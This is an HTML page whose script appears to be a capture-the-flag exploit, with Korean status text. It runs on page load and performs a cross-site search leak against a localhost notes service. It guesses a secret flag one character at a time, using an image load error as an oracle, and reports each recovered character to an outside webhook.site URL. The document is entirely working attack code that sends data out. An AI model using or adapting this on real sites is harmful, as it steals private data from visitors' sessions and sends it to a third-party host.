<!DOCTYPE html>
<html>
<body>
    <h1 id="status">상태 확인 중...</h1>
    <script>
        const TARGET = 'http://localhost:3031'; 
        const REPORT_URL = 'https://webhook.site/c4734990-7292-43a9-97fc-54ef27ff7a64'; 
        let flag = "RS{";
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";

        function report(msg) {
            fetch(`${REPORT_URL}?log=${encodeURIComponent(msg)}`);
            document.getElementById('status').innerText = msg;
        }

        async function leak(query) {
            try {
                await fetch(`${TARGET}/api/notes?search=${query}`, { mode: 'no-cors' });
                
                return new Promise((resolve) => {
                    const img = new Image();
                    img.src = `${TARGET}/image?cb=${Math.random()}`;
                    img.onload = () => resolve(false); 
                    img.onerror = () => resolve(true);  
                });
            } catch (e) {
                return false;
            }
        }

        async function start() {
            report("start (Target: " + TARGET + ")");

            const alive = await fetch(TARGET, { mode: 'no-cors' }).then(() => true).catch(() => false);
            report("server test: " + (alive ? "성공" : "실패"));

            if (!alive) {
                report("안됨");
                return;
            }

            report("검사");
            for (let i = 0; i < 20; i++) {
                let found = false;
                for (let c of chars) {
                    if (await leak(flag + c)) {
                        flag += c;
                        report("와!: " + flag);
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    report("이제없음 (현재: " + flag + ")");
                    break;
                }
            }
        }

        start();
    </script>
</body>
</html>
